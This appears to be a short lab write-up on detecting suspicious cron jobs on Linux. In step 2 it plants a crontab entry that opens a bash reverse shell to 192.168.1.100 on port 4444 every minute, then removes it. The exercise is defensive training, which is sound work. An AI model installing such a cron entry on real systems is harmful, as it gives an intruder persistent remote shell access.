# Crontab Monitoring for Suspicious Scheduled Tasks

This project demonstrates how to monitor and detect suspicious or malicious scheduled tasks on a Linux system using `crontab`.

##  **Tools Used**

- **Crontab**: A time-based job scheduler in Unix-like systems.
- **Kali Linux**: Host operating system.

---

##  **Steps Taken**

###  1. **View Current User’s Crontab**

Checked the current user's scheduled jobs to verify if any exist:

```bash
crontab -l
```

If no jobs are listed, it means there are no scheduled tasks for the current user.

---

###  2. **Create a Suspicious Cron Job**

Edited the current user's crontab to simulate an unauthorized task (e.g., reverse shell or hidden script):

```bash
crontab -e
```

Inside the editor, added a suspicious job such as:

```
* * * * * /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

>  _This job mimics a reverse shell attempting to connect to a remote server every minute._

---

###  3. **List and Analyze Crontab Again**

Ran the command to list current jobs and reviewed any potentially harmful entries:

```bash
crontab -l
```

Screenshot was taken at this stage.

---

###  4. **Remove Suspicious Entry**

Removed the suspicious cron entry by opening the editor again and deleting the line:

```bash
crontab -e
```

Saved and exited to confirm changes.

---

##  **Screenshot**

![Suspicious crontab job](./screenshot.png)

---

##  **Summary**

Crontab entries can be leveraged by attackers to maintain persistence or automate malicious behavior. This project highlights how routine monitoring of cron jobs can help detect unauthorized tasks early. Regular audits are essential to prevent silent backdoors and maintain system integrity.

